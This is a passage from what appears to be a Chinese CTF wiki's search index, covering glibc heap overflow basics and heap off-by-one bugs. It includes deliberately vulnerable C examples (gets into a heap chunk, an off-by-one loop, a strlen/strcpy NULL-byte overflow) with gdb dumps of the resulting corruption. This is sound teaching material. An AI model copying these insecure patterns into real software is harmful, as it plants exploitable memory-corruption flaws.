0x0000000000020fe1\n\n\n16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n\n\n\u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk \u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002\n\u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002", 
            "title": "\u5806\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_1", 
            "text": "", 
            "title": "\u5806\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_2", 
            "text": "\u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08 \u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570 \uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230 \u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740 \u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002  \u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f   \u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002  \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002   \u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002  \u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f   \u8986\u76d6\u4e0e\u5176 \u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk  \u7684\u5185\u5bb9\u3002  prev_size  size\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002  NON_MAIN_ARENA   IS_MAPPED    PREV_INUSE   the True chunk size    chunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002    \u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_3", 
            "text": "\u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a  #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n}  \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002 0x602000:   0x0000000000000000  0x0000000000000021  ===chunk\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  ===top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000 \nprint 'A'*100\n\u8fdb\u884c\u5199\u5165 0x602000:   0x0000000000000000  0x0000000000000021  ===chunk\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x4141414141414141  ===top chunk(\u5df2\u88ab\u6ea2\u51fa)\n0x602030:   0x4141414141414141  0x4141414141414141\n0x602040:   0x4141414141414141  0x4141414141414141", 
            "title": "\u57fa\u672c\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_4", 
            "text": "\u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_5", 
            "text": "\u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f  calloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684 \u3002  calloc(0x20);\n//\u7b49\u540c\u4e8e\nptr=malloc(0x20);\nmemset(ptr,0,0x20); \n\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002 #include  stdio.h \n\nint main(void) \n{\n  char *chunk,*chunk1;\n  chunk=malloc(16);\n  chunk1=realloc(chunk,32);\n  return 0;\n} \nrealloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c   \u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6  \u5982\u679c\u7533\u8bf7size \u539f\u6765size  \u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f  \u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size)     \u5982\u679c\u7533\u8bf7size \u539f\u6765size  \u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8  \u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206      \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr)  \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c", 
            "title": "\u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_6", 
            "text": "\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002  \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b   \u8f93\u5165  gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565  '\\x00'  scanf  vscanf    \u8f93\u51fa  sprintf    \u5b57\u7b26\u4e32  strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230  '\\x00'  \u505c\u6b62  strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230  '\\x00'  \u505c\u6b62  bcopy", 
            "title": "\u5bfb\u627e\u5371\u9669\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_7", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb \u3002\n\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c malloc(0) \u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002  #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(0);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n}  //\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f  \u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801 #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n} \n\u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002 0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)   \u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk \u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002 \u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002", 
            "title": "\u786e\u5b9a\u586b\u5145\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/heap/off_by_one/", 
            "text": "\u5806\u4e2d\u7684 Off-By-One\n\n\n\u4ecb\u7ecd\n\n\n\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002\n\n\noff-by-one \u6f0f\u6d1e\u539f\u7406\n\n\noff-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec\n\n\n\n\n\u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002\n\n\n\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002\n\u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002\n\n\n\u793a\u4f8b1\n\n\nint my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i\n=size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts(\nGet Input:\n);\n    my_gets(chunk1,16);\n    return 0;\n}\n\n\n\n\n\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef\n\n\n\n\nwikipedia:\n\u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a\n\n\n\u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f\n\n\n\n\n\n\u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002\n\n\n\n\n\u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 \n=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df\nprint 'A'*17\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021 \n=== chunk2 \n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\n\u793a\u4f8b2\n\n\n\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef\n\n\nint main(void)\n{\n    char buffer[40]=\n;\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\nGet Input\n);\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n\n}\n\n\n\n\n\u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002\n\u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002\nstrlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \n'\\x00'\n \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \n'\\x00'\n \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000411 \n=== next chunk\n\n\n\n\n\u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy\n\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400\n\n\n\n\n\u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 \n'\\x00'\n \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one 